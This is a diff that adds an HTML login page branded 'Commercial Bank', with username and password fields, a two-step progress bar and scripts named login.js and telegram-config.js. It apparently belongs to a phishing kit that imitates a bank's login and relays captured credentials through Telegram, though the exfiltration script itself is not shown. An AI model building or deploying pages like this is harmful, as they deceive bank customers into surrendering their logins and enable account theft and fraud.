@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Commercial Bank</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Header -->
+        <header class="login-header">
+            <button class="back-btn" onclick="window.location.href='index.html'">
+                <span class="back-icon">✕</span>
+            </button>
+            <h1 class="header-title">Login Using Password</h1>
+        </header>
+
+        <!-- Main Content -->
+        <main class="login-main">
+            <div class="login-card">
+                <!-- Progress Indicator -->
+                <div class="progress-section">
+                    <div class="step-indicator">STEP 1 OF 2</div>
+                    <div class="progress-bars">
+                        <div class="progress-bar active"></div>
+                        <div class="progress-bar"></div>
+                    </div>
+                </div>
+
+                <!-- Login Form -->
+                <div class="login-form">
+                    <h2 class="form-title">Login using password</h2>
+
+                    <!-- Username Field -->
+                    <div class="input-group">
+                        <div class="label-row">
+                            <label for="username" class="input-label">Username *</label>
+                            <a href="#" class="forgot-link">Forgot username?</a>
+                        </div>
+                        <input type="text" id="username" class="form-input" placeholder="Enter your username" required>
+                    </div>
+
+                    <!-- Password Field -->
+                    <div class="input-group">
+                        <label for="password" class="input-label">Password *</label>
+                        <div class="input-wrapper password-wrapper">
+                            <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+                            <button type="button" class="toggle-password" id="togglePassword">
+                                <span class="eye-icon">👁️</span>
+                                <span class="toggle-text">Show</span>
+                            </button>
+                        </div>
+                        <a href="#" class="forgot-link">Forgot password?</a>
+                    </div>
+
+                    <!-- Login Button -->
+                    <button type="submit" class="login-submit-btn" id="loginSubmitBtn">
+                        Login
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="telegram-config.js"></script>
+    <script src="login.js"></script>
+</body>
+</html>
